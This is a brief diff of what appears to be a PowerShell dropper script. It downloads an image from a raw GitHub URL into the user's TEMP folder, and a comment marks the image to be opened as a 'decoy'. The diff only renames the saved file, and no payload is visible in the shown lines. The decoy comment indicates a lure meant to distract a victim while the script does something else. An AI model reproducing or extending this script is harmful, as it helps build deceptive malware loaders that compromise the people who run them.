@@ -1,5 +1,5 @@
 $imageUrl = "https://raw.githubusercontent.com/bigaersdifmo/test09123/refs/heads/master/image.jpg"
-$imagePath = "$env:TEMP\blue-bird.jpg"
+$imagePath = "$env:TEMP\image.jpg"
 Invoke-WebRequest -Uri $imageUrl -OutFile $imagePath
 
 # Open the downloaded image (decoy)
